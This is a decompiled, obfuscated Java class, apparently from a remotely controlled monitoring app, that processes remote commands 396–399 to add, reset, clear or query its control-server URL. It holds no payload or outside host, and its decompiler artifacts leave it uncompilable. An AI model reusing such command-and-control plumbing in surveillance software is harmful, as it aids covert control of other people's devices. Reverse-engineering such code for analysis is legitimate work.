package com.vvt.remotecommand.processor.i;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

public class a
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  private String b = "";
  
  public a(com.vvt.remotecontrol.a parama, String paramString)
  {
    super(parama);
    this.b = paramString;
  }
  
  public static boolean a(String paramString)
  {
    boolean bool1 = false;
    String str = "396";
    boolean bool2 = str.equals(paramString);
    if (!bool2)
    {
      str = "397";
      bool2 = str.equals(paramString);
      if (!bool2)
      {
        str = "398";
        bool2 = str.equals(paramString);
        if (!bool2)
        {
          str = "399";
          bool2 = str.equals(paramString);
          if (!bool2) {
            return bool1;
          }
        }
      }
    }
    bool1 = true;
    return bool1;
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = paramRemoteCommand.getParameters();
    Object localObject2 = new com/vvt/remotecontrol/ControlCommand;
    ((ControlCommand)localObject2).<init>();
    Object localObject3 = this.b;
    String str = "396";
    boolean bool2 = ((String)localObject3).equals(str);
    boolean bool3;
    if (bool2)
    {
      localObject3 = RemoteFunction.ADD_URL;
      ((ControlCommand)localObject2).setFunction((RemoteFunction)localObject3);
      ((ControlCommand)localObject2).setData(localObject1);
      bool1 = a;
      if (bool1) {}
      localObject1 = (RmtCtrlOutputStatusMessage)h().execute((ControlCommand)localObject2);
      bool3 = a;
      if ((!bool3) || (paramc != null))
      {
        bool3 = ((RmtCtrlOutputStatusMessage)localObject1).isSuccess();
        if (!bool3) {
          break label270;
        }
        bool3 = a;
        if (bool3) {}
        localObject1 = ((RmtCtrlOutputStatusMessage)localObject1).getMessage();
        paramc.b(paramRemoteCommand, this, (String)localObject1);
      }
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return;
      localObject3 = this.b;
      str = "397";
      bool2 = ((String)localObject3).equals(str);
      if (bool2)
      {
        localObject3 = RemoteFunction.RESET_URL;
        ((ControlCommand)localObject2).setFunction((RemoteFunction)localObject3);
        break;
      }
      localObject3 = this.b;
      str = "398";
      bool2 = ((String)localObject3).equals(str);
      if (bool2)
      {
        localObject3 = RemoteFunction.CLEAR_URL;
        ((ControlCommand)localObject2).setFunction((RemoteFunction)localObject3);
        break;
      }
      localObject3 = this.b;
      str = "399";
      bool2 = ((String)localObject3).equals(str);
      if (!bool2) {
        break;
      }
      localObject3 = RemoteFunction.QUERY_URL;
      ((ControlCommand)localObject2).setFunction((RemoteFunction)localObject3);
      break;
      label270:
      bool3 = a;
      if (bool3) {}
      localObject2 = new com/vvt/remotecommand/exception/RemoteCommandException;
      localObject1 = ((RmtCtrlOutputStatusMessage)localObject1).getMessage();
      ((RemoteCommandException)localObject2).<init>((String)localObject1);
      paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject2);
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "ProcManageServerUrl";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/i/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */